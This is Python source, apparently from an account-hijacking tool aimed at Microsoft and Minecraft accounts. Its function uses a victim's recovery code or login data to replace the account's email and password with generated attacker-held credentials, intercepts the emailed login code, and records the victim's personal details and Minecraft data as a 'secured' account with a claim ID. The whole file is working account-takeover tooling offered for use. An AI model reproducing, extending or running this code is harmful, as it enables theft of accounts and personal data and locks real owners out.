from securing.utils.login_authenticator import login_authenticator
from securing.utils.cookies.get_livedata import livedata
from securing.utils.security.recovery import recover
from securing.utils.get_email_code import get_email_code
from securing.secure import startSecuringAccount
from securing.auth.send_auth import send_auth

from securing.build_embeds import build_account_embeds
from securing.auth.initial_session import get_session
from securing.utils.secure import secure

from database.database import DBConnection
from time import time
import logging
import json
import uuid

config = json.load(open("config/config.json", "r"))

async def recovery_secure(email: str, type: str, data: dict) -> dict:

    session = get_session()

    account = {
        "microsoft": {
            "email": "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get"
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }

    sname = uuid.uuid4().hex[:16]
    password = uuid.uuid4().hex[:12]

    security_email = f"{sname}@{config["domain"]}"
    print(f"[+] - Generated Security Email ({security_email})")

    with DBConnection() as database:
        database.add_security_email(security_email, password)

    initialTime = time()
    print("[~] - Logging in session...")

    match type:
        case "rcode":
            recovery_code = await recover(
                session = session,
                email = email,
                recovery_code = data["recovery_code"],
                new_email = security_email,
                new_password = password
            )
            
            if recovery_code:
                print("[+] - Changed password and recovery code")

                info = await send_auth(session, email)
                flowtoken = info["response"]["Credentials"]["OtcLoginEligibleProofs"][0]["data"]

                code = await get_email_code(security_email)
                print(f"Got code - {code}")

                live = await livedata(session)
                ppft = live["ppft"]

                account = await startSecuringAccount(
                    session = session,
                    email = email,
                    device = flowtoken,
                    ppft = ppft,
                    code = code,
                    recovery = False,
                    rextra = {
                        "security_email": security_email,
                        "password": password,
                        "recovery_code": recovery_code
                    }
                )

                return account
            
            else:
                return None
            
        case "authpwd":
            await login_authenticator(
                session = session,
                email = email,
                data = data
            )
            
            dsecured = await secure(session, True, account)

    logging.info(f"Account: {dsecured}")

    final_time = (time() - initialTime)

    claim_id = uuid.uuid4().hex
    with DBConnection() as database:
        database.add_secured_account(claim_id, dsecured)

    build_account = await build_account_embeds(dsecured, final_time, claim_id)
    return build_account